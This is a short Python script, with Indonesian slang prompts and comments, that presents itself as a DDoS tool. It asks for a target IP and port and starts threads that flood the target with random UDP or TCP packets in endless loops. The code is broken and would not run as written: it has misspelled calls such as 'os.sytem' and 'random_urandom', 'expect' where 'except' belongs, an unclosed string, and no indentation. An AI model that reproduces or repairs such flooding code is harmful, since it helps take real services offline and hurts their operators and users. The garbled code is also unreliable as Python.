#!/usr/bin/env python3
#Ngentod
import random
import socket
import threading
import os
os.sytem("clear")
print("DDOS ATTACK")
print("DONT ABUSE TOOLS)
ip = str(input("DDOS ATTACK | ip:"))
port = int(input("DDOS ATTACK | port:"))
choice = str(input("DDOS ATTACK| Gas Gak Nih?(y/n:"))
times = int(input("MAU BRP PAKET NYA:"))
threads = int(input("ISI BRP PAKET NYA:"))
def run():
data = random_urandom(8192)
i = random.choice(("[*]","[!]","[#]"))
while True:
try:
s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
addr = (str(ip),int(port))
for x in range(times):
s.sendto(data,addr)
print(i +" | DDOS ATTACK |")
expect:
print("[!] | PAKET DAH SAMPE OM |")
def run2():
data = random_urandom(82)
i = random.choice(("[*]","[!]","[#]"))
while True:
try:
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
s.send(data)
for x in range(times):
s.send(data)
print(i +" DDOS ATTACK")
expect:
s.close()
print("[*] PAKET DAH TIBA")
for y in range(threads):
if choice =='y':
th = threading.Thread(target = run)
th.start()
else:
th = threading.Thread(target = run2)
th.start()